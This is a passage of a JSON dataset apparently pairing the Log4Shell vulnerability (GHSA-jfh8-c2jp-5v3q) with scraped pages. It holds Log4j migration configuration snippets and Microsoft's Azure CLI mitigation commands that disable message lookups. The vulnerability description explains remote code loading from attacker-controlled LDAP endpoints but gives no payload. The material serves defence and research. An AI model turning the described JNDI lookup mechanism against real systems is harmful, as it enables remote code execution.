        "code": "<Configuration status=\"debug\">\r  <Appenders>\r    <File name=\"TEMP\" fileName=\"temp\">\r      <PatternLayout pattern=\"%r [%t] %p %c %notEmpty{%ndc }- %m%n\"/>\r    </File>\r    <Async name=\"ASYNC\">\r      <AppenderRef ref=\"TEMP\"/>\r    </Async>\r  </Appenders>\r  <Loggers>\r    <Root level=\"debug\">\r      <AppenderRef ref=\"ASYNC\"/>\r    </Root>\r  </Loggers>\r</Configuration>",
        "preamble": "Log4j 2 XML configuration."
      },
      {
        "code": "<!DOCTYPE log4j:configuration PUBLIC \"-//APACHE//DTD LOG4J 1.2//EN\" \"log4j.dtd\">\r<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\" configDebug=\"true\">\r  <appender name=\"ASYNC\" class=\"org.apache.log4j.AsyncAppender\">\r    <appender-ref ref=\"TEMP\"/>\r    <appender-ref ref=\"CONSOLE\"/>\r  </appender>\r  <appender name=\"CONSOLE\" class=\"org.apache.log4j.ConsoleAppender\">\r    <layout class=\"org.apache.log4j.PatternLayout\">\r      <param name=\"ConversionPattern\" value=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </layout>\r  </appender>\r  <appender name=\"TEMP\" class=\"org.apache.log4j.FileAppender\">\r    <param name=\"File\" value=\"temp\"/>\r    <layout class=\"org.apache.log4j.PatternLayout\">\r      <param name=\"ConversionPattern\" value=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </layout>\r  </appender>\r  <root>\r    <priority value=\"debug\"/>\r    <appender-ref ref=\"ASYNC\"/>\r  </Root>\r</log4j:configuration>",
        "preamble": "Log4j 1.x XML configuration using the AsyncAppender."
      },
      {
        "code": "<Configuration status=\"debug\">\r  <Appenders>\r    <Console name=\"CONSOLE\" target=\"SYSTEM_OUT\">\r      <PatternLayout pattern=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </Console>\r    <File name=\"TEMP\" fileName=\"temp\">\r      <PatternLayout pattern=\"%d %-5p [%t] %C{2} (%F:%L) - %m%n\"/>\r    </File>\r    <Async name=\"ASYNC\">\r      <AppenderRef ref=\"TEMP\"/>\r      <AppenderRef ref=\"CONSOLE\"/>\r    </Async>\r  </Appenders>\r  <Loggers>\r    <Root level=\"debug\">\r      <AppenderRef ref=\"ASYNC\"/>\r    </Root>\r  </Loggers>\r</Configuration>",
        "preamble": "Log4j 2 XML configuration. Note that the Async Appender should be configured after the appenders it references. This will allow it to shut down properly."
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Log4j – Migrating from Log4j 1.x to 2.x",
    "url": "https://logging.apache.org/log4j/2.x/manual/migration.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "\n\n$ az webapp config appsettings set \\\n\n --resource-group <group-name> \\\n\n --name <app-name> \\\n\n --settings LOG4J_FORMAT_MSG_NO_LOOKUPS=true\n",
        "preamble": "Copy"
      },
      {
        "code": "$ az functionapp config appsettings set \\ --subscription \\ --name \\ --resource-group \\ --settings \"LOG4J_FORMAT_MSG_NO_LOOKUPS=true\" \"WEBSITE_USE_PLACEHOLDER=0\"",
        "preamble": "Dedicated and Premium Functions : Create two application settings:\n\nLOG4J_FORMAT_MSG_NO_LOOKUPS with value =true\nWEBSITE_USE_PLACEHOLDER with value =0\n\nThis can be done with the following Azure CLI command:"
      },
      {
        "code": "$ az spring-cloud app update -s ${SERVICE_NAME} \\ -n ${APP_NAME} -d ${DEPLOYMENT_NAME} -g ${RESOURCE_GROUP} \\ --jvm-options='-Dlog4j2.formatMsgNoLookups=true'",
        "preamble": "You can set the log4j2.formatMsgNoLookups system property to true using the Azure CLI:"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Microsoft’s Response to CVE-2021-44228 Apache Log4j 2 | MSRC Blog | Microsoft Security Response Center",
    "url": "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  }
]
